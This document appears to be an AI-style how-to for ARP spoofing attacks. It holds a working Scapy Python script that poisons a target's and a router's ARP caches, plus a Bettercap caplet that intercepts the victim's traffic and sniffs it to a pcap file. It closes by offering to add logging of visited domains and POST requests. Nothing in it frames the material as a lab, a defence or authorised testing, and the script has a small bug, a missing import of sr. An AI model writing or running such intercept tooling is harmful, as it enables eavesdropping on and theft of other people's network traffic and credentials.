## Option 1: Python Script with Scapy

### Requirements

* Run as **root**
* Works on Linux (Kali, Ubuntu, etc.)
* Install Scapy:

  ```bash
  pip install scapy
  ```

### Script: `arp_spoof.py`

```python
from scapy.all import ARP, Ether, send
import time
import sys
import signal

def spoof(target_ip, spoof_ip, interface):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, iface=interface, verbose=False)

def restore(target_ip, router_ip, interface):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac, hwsrc=router_mac), count=5)
    send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac, hwsrc=target_mac), count=5)

def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None

def main():
    if len(sys.argv) != 4:
        print("Usage: sudo python3 arp_spoof.py <target_ip> <router_ip> <interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    router_ip = sys.argv[2]
    interface = sys.argv[3]

    print(f"[+] Spoofing {target_ip} pretending to be {router_ip}...")

    try:
        while True:
            spoof(target_ip, router_ip, interface)
            spoof(router_ip, target_ip, interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring ARP tables...")
        restore(target_ip, router_ip, interface)

if __name__ == "__main__":
    main()
```

### Example usage:

```bash
sudo python3 arp_spoof.py 192.168.1.50 192.168.1.1 wlan0
```



## Option 2: Bettercap Caplet Script

Create a file named `spoof.cap`:

```bash
set arp.spoof.targets 192.168.1.50
set net.sniff.output /home/kali/logs.pcap
set net.sniff.verbose true
arp.spoof on
net.sniff on
```

### Run it with:

```bash
sudo bettercap -iface wlan0 -caplet spoof.cap
```

You can add modules like `dns.spoof`, `https.proxy`, etc., inside the caplet file.

---

## Additional features?

* Enables IP forwarding automatically?
* Logs visited domains and POST requests?
* Works across multiple targets?


